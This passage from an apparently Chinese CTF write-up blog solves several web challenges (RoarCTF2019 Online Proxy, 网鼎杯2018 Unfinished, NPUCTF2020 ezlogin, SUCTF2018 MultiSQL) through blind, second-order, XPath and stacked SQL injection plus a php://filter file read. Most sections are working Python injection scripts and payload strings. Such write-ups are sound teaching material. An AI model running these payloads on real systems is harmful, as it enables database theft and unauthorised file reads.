&quot;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;ctf&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((select(group_concat(flag,0x3a,value))from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)&quot;</span></span><br><span class="line">        response = requests.post(url+payload.format(i, mid))</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        result += chr(low)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<h3 id="拓展">拓展</h3>
<p>我们再吹毛求疵一点，上一个脚本跑出来的flag都是大写字母，那么我们应该如何区分大小写呢。</p>
<p>参考中的第二篇文章已经告诉了我们答案，想办法把字符串转换为二进制后，进行字节对字节的比较。但是函数<code>BINARY</code>中的<code>in</code>被禁掉了，作者又发现了一种思路，当一个字符串连接一个二进制的值时<code>CONCAT(&quot;aa&quot;, BINARY(&quot;BB&quot;))</code>，其得到的也将是二进制。</p>
<p>并且MySQL中的JSON对象是二进制对象，因此，<code>CAST(0 AS JSON)</code>会返回一个二进制字符串，进而<code>SELECT CONCAT(“A”, CAST(0 AS JSON))</code>也会返回一个二进制字符串。</p>
<p>所以我们看一看下面这个payload能否可行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2||(select 1,concat(&#39;&#123;&#125;&#39;,cast(&#39;0&#39; as json)))&gt;(select * from f1ag_1s_h3r3_hhhhh)</span><br></pre></td></tr></table></figure>
<p>返回了error。我猜应该是版本的问题，用第一个盲注脚本查看一下version()，发现是MariaDB 10.2.26。</p>
<p>查询一下官方文档，MariaDB在10.2.7才加入了JSON数据类型。</p>
<p>无果。</p>
<h3 id="参考">参考</h3>
<p><a href="https://www.gem-love.com/ctf/1782.html">https://www.gem-love.com/ctf/1782.html</a></p>
<p><a href="https://nosec.org/home/detail/3830.html">https://nosec.org/home/detail/3830.html</a></p>
<h2 id="RoarCTF2019-Online-Proxy">RoarCTF2019 Online Proxy</h2>
<h3 id="考点-v18">考点</h3>
<ul>
<li>XFF注入</li>
<li>二次注入</li>
<li>盲注</li>
</ul>
<h3 id="题解-v2">题解</h3>
<p>这道题的注入点在X-Forwarded-For，利用XFF来更改IP地址，可以发现IP被保存并输出了。</p>
<p>既然他的last-ip和current-ip会更新，由此可以猜想他与数据库进行了交互</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (<span class="keyword">current</span>-ip,<span class="keyword">last</span>-ip ) <span class="keyword">VALUES</span> (<span class="string">&#x27;$current-ip&#x27;</span>,<span class="string">&#x27;$last-ip&#x27;</span> );</span><br></pre></td></tr></table></figure>
<p>由于这题有回显，因此，可以考虑二次注入。</p>
<p>首先用下面这个payload验证一下能不能成功地闭合语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&#39; or ascii(substr((select(database())),1,1))&gt;100 or &#39;0</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721181214.png" alt=""></p>
<p>再随便输入</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721181937.png" alt=""></p>
<p>再次发送请求</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721182026.png" alt=""></p>
<p>验证成功，接下来就是写盲注脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node3.buuoj.cn:29354/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个head头好像必须加cookie</span></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">&quot;X-Forwarded-For&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;track_uuid=60661451-cdab-4a74-95b4-74d6a66945a9&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># #查库名</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># #查表名</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;F4l9_D4t4B45e&#x27;)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># #查列名</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F4l9_t4b1e&#x27;)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查flag</span></span><br><span class="line">payload = <span class="string">&quot;0&#x27; or ascii(substr((select(group_concat(F4l9_C01uMn))from(F4l9_D4t4B45e.F4l9_t4b1e)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">137</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;插入sql语句&#x27;&#x27;&#x27;</span></span><br><span class="line">        payload1 = payload.format(i, mid)</span><br><span class="line">        head[<span class="string">&quot;X-Forwarded-For&quot;</span>] = payload1</span><br><span class="line">        requests.get(url, headers=head)</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;重新发送两次请求&#x27;&#x27;&#x27;</span></span><br><span class="line">        head[<span class="string">&quot;X-Forwarded-For&quot;</span>] = <span class="string">&quot;penson&quot;</span></span><br><span class="line">        requests.get(url, headers=head)</span><br><span class="line">        r = requests.get(url, headers=head)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Last Ip: 1 &quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<h3 id="拓展-v2">拓展</h3>
<p>更多的闭合方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; or (payload) or &#39;</span><br><span class="line">&#39; and (payload) and &#39;</span><br><span class="line">&#39; or (payload) and &#39;</span><br><span class="line">&#39; or (payload) and &#39;&#x3D;&#39;</span><br><span class="line">&#39;* (payload) *&#39;</span><br><span class="line">&#39; or (payload) and &#39;</span><br><span class="line">&quot; – (payload) – &quot;</span><br></pre></td></tr></table></figure>
<p>还有一种payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&#39;+conv(hex(substr((select database()),1,5)),16,10)+&#39;0</span><br></pre></td></tr></table></figure>
<p>注意：一次不能读太多位，不然10进制会用科学计数法表示，就无法转换回原字符串了。</p>
<h2 id="网鼎杯2018-Unfinished">网鼎杯2018 Unfinished</h2>
<h3 id="考点-v19">考点</h3>
<ul>
<li>二次注入</li>
<li>两次Hex编码</li>
</ul>
<h3 id="解题-v17">解题</h3>
<p>登陆的时候用到的是邮箱和密码，而注册的时候还有一个用户名，而这个用户名却在登陆后显示了，所以我们考虑用户名这里可能存在 <strong>二次注入</strong>。</p>
<p>注册成功，会得到 <strong>302</strong> 状态码并跳转至 <strong>login.php</strong> ；如果注册失败，只会返回 <strong>200</strong> 状态码。所以构造 <strong>payload</strong> 如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">email&#x3D;test@666.com&amp;username&#x3D;0&#39;%2B(select hex(hex(database())))%2B&#39;0&amp;password&#x3D;test</span><br></pre></td></tr></table></figure>
<p>在这里解释一下为什么要两次hex加密：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721213306.png" alt=""></p>
<p>上面这张图展示的是，如果字符串hex后的值中包含字母，在与0相加后只能显示字母之前的数字与0相加的结果。两次hex编码可以解决这个问题。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721214124.png" alt=""></p>
<p>然后这里还要注意一个问题，就是当数据进过 <strong>两次hex</strong> 后，会得到较长的一串只含有数字的字符串，当这个长字符串转成数字型数据的时候会变成科学计数法，就无法还原本身的字符串。</p>
<p>所以这里我们使用 substr 每次取10个字符长度与 ‘0’ 相加，这样就不会丢失数据。但是这里使用逗号 <strong>,</strong> 会出错，所以可以使用类似 substr(‘test’ from 1 for 10) 这种写法来绕过，具体获取 <strong>flag</strong> 的payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&#39;%2b(select substr(hex(hex((select * from flag))) from 1 for 10))%2b&#39;0</span><br></pre></td></tr></table></figure>
<p>注入脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re, binascii</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7fb57b69-428d-4c33-8988-d08449ffb183.node3.buuoj.cn/&quot;</span></span><br><span class="line">sql = <span class="string">&quot;select * from flag&quot;</span></span><br><span class="line"></span><br><span class="line">email = [<span class="string">&quot;test0&quot;</span> + str(i) + <span class="string">&quot;@aa.aa&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">24</span>)]  <span class="comment"># 这里次数可以通过sql爆破flag长度得到，或者也可fuzz</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>(<span class="params">email, offset</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;0&#x27;+(select substr(hex(hex((&#123;0&#125;))) from &#123;1&#125; for 10))+&#x27;0&quot;</span>.format(sql, str(<span class="number">1</span> + offset * <span class="number">10</span>))</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: email,</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    req = requests.post(url + <span class="string">&quot;/register.php&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">email</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: email,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url + <span class="string">&quot;/login.php&quot;</span>, data, allow_redirects=<span class="literal">True</span>)</span><br><span class="line">    pattern = <span class="string">&#x27;&lt;span class=\&quot;user-name\&quot;&gt;\s*(\d&#123;1,10&#125;)\s*&lt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> re.findall(pattern, r.text)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    raw = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> email, offset <span class="keyword">in</span> zip(email, range(<span class="number">0</span>, len(email))):</span><br><span class="line">        register(email, offset)</span><br><span class="line">        test = login(email)</span><br><span class="line">        print(test)</span><br><span class="line">        raw += test</span><br><span class="line">        sys.stdout.write(<span class="string">&quot;[-] Double Hex : -&gt; %s &lt;-\r&quot;</span> % (raw))</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;[+] Double Hex : -&gt; &#123;&#125; &lt;-&quot;</span>.format(raw))</span><br></pre></td></tr></table></figure>
<h2 id="BlackWatch-入群题-Web">BlackWatch 入群题 Web</h2>
<h3 id="考点-v20">考点</h3>
<ul>
<li>MySQL盲注</li>
</ul>
<h3 id="解题-v18">解题</h3>
<p>盲注脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0b5ee7e6-71d1-4280-9dd3-6e27f0650b68.node3.buuoj.cn/backend/content_detail.php?id=&quot;</span></span><br><span class="line">proxies = &#123; <span class="string">&quot;http&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;https&quot;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">name = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = head + tail &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = &quot;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d,3,2)&quot; % (i, mid)</span></span><br><span class="line">        <span class="comment"># payload = &quot;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;contents&#x27;)),%d,1))&gt;%d,3,2)&quot; % (i, mid)</span></span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((select(group_concat(password))from(admin)),%d,1))&gt;%d,3,2)&quot;</span> % (i, mid)</span><br><span class="line"></span><br><span class="line">        r = requests.get(url + payload, proxies=proxies)</span><br><span class="line">        <span class="comment"># print(url+payload)</span></span><br><span class="line">        <span class="comment"># print(r.json())</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Yunen&quot;</span> <span class="keyword">in</span> str(r.json()):</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        name += chr(head)</span><br><span class="line">        print(name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h2 id="NPUCTF2020-ezlogin">NPUCTF2020 ezlogin</h2>
<h3 id="考点-v21">考点</h3>
<ul>
<li><a href="https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">Xpath注入</a></li>
</ul>
<h3 id="解题-v19">解题</h3>
<table>
<thead>
<tr>
<th>payload</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>’ or count(/)=1 or '1</td>
<td>判断有几个根节点</td>
</tr>
<tr>
<td>’ or string-count(name(/*[1]))=1 or '1</td>
<td>获取根节点长度</td>
</tr>
<tr>
<td>'or substring(name(/*[1]), 1, 1)=‘a’ or '1</td>
<td>获取内容</td>
</tr>
</tbody>
</table>
<p>盲注脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://90cceea4-fbed-4c2b-97de-a43474dea042.node3.buuoj.cn/login.php&#x27;</span></span><br><span class="line">sess = requests.session()</span><br><span class="line">strs = string.digits + string.ascii_letters</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/xml&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">find = re.compile(<span class="string">&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">        r = sess.post(url=url)</span><br><span class="line">        token = find.findall(r.text)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> token:</span><br><span class="line">            <span class="comment"># 根节点root</span></span><br><span class="line">            <span class="comment"># data = &quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i, j, token[0])</span></span><br><span class="line">            <span class="comment"># root子节点accounts</span></span><br><span class="line">            <span class="comment"># data = &quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(</span></span><br><span class="line">            <span class="comment"># accounts子节点user</span></span><br><span class="line">            <span class="comment"># data = &quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(</span></span><br><span class="line">            <span class="comment"># user子节点id, username, password</span></span><br><span class="line">            <span class="comment"># data = &quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(</span></span><br><span class="line">            <span class="comment"># data = &quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(</span></span><br><span class="line">            data = <span class="string">&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.format(</span><br><span class="line">                i, j, token[<span class="number">0</span>])</span><br><span class="line">            res = sess.get(url=url, headers=headers, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;非法操作&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                result += j</span><br><span class="line">                print(result)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>最后可以判断格式为：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">accounts</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">username</span>&gt;</span>gtfly123<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">password</span>&gt;</span>e10adc3949ba59abbe56e057f20f883e<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">username</span>&gt;</span>adm1n<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">password</span>&gt;</span>cf7414b5bdb2e65ee43083f4ddbc4d9f<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>password无法解密，使用<code>adm1n gtfly123</code>登录站点。</p>
<p>查看网页源代码，提示：<code>flag is in /flag</code></p>
<p>存在文件包含，使用大小写绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin.php?file&#x3D;PHP:&#x2F;&#x2F;filter&#x2F;convert.BASE64-encode&#x2F;resource&#x3D;&#x2F;flag</span><br></pre></td></tr></table></figure>
<h2 id="SUCTF2018-MultiSQL">SUCTF2018 MultiSQL</h2>
<h3 id="考点-v22">考点</h3>
<ul>
<li>堆叠注入</li>
<li>MySQL预编译绕过</li>
</ul>
<h3 id="解题-v20">解题</h3>
<p>首先来演示一下MySQL预编译</p>
<h4 id="set">set</h4>
<p>set 的作用就是定义一个变量，变量的命名必须是@开头。</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201014115534.png" style="zoom:50%;" />
<h4 id="prepare和execute">prepare和execute</h4>
<p>prepare语句用于预定义一个语句，并可以指定预定义语句名称。execute则是执行预定义语句。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">prepare prepare_name from “sql语句”</span><br><span class="line"></span><br><span class="line">execute prepare_name</span><br></pre></td></tr></table></figure>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201014115731.png" style="zoom:50%;" />
<p>结合起来利用就是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; set @a&#x3D;&#39;select version()&#39;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; prepare t from @a;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; execute t;</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 8.0.20    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>用上面的知识再结合16进制编码，这样就可以绕过对一些关键字(select,from之类的)的过滤。</p>
<p>比如：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201014120236.png" alt=""></p>
<p>回到题目，注册成功后登陆查看资料，发现url如下：</p>
<p><code>http://87e3250e-37a7-472a-b4e3-764ad942514d.node3.buuoj.cn/user/user.php?id=2</code></p>
<p>id处可能有SQL注入，过滤了单引号还有一些关键字，用异或注入：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201014155145.png" alt=""></p>
<p>由于过滤了<code>union，select ，&amp;，|</code>还有一些函数，只能Get Shell才能拿到flag。</p>
<blockquote>
<p>存在SQL注入的题目都可以直接load_file盲注flag。</p>
</blockquote>
<p>查看<code>secure_file_priv</code>配置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;&quot;http://9ba27d3d-01fd-4c6e-8c1c-e52d69a8a150.node3.buuoj.cn/user/user.php?id=&quot;&quot;&quot;</span></span><br><span class="line">r = requests.session()</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;o5lhvid6588d0rgkgieh1vne75&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">char = string.ascii_lowercase + string.digits + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;2-(@@secure_file_priv&lt;BINARY(0x&#123;0&#125;))&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">data = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">hex = <span class="keyword">lambda</span> s: binascii.b2a_hex(s.encode(<span class="string">&quot;utf-8&quot;</span>)).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">        c = chr(i)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        _url = url + payload.format(flag+hex(c))</span><br><span class="line">        res = r.get(url=_url, cookies=cookies)</span><br><span class="line">        <span class="comment"># print(res.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            data += chr(i<span class="number">-1</span>)</span><br><span class="line">            flag += hex(chr(i<span class="number">-1</span>))</span><br><span class="line">            print(data)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>
<p>盲注出<code>secure_file_priv=/var/www/</code></p>
<p>使用load_file函数读取index.php文件<code>/var/www/html/index.php</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;&quot;http://9ba27d3d-01fd-4c6e-8c1c-e52d69a8a150.node3.buuoj.cn/user/user.php?id=&quot;&quot;&quot;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;fg4kp97ksielnvnssv53iul2s6&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data=<span class="string">&#x27;0x&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">r=requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9999</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        _url = url + <span class="string">&#x27;^(hex(load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870))&lt;&#x27;</span>+data+str(hex(i)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)+<span class="string">&#x27;)&#x27;</span></span><br><span class="line">        result=r.get(url=url,cookies=cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">            data+=str(hex(i<span class="number">-1</span>)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            flag+=(chr(i<span class="number">-1</span>))</span><br><span class="line">            <span class="keyword">print</span> (flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>
<p>发现包含了bwvs_config/config.php和waf.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">		$black_str = <span class="string">&quot;/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i&quot;</span>;</span><br><span class="line">		$str = preg_replace($black_str, <span class="string">&quot;@@&quot;</span>,$str);</span><br><span class="line">		<span class="keyword">return</span> addslashes($str);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>user.php</p>
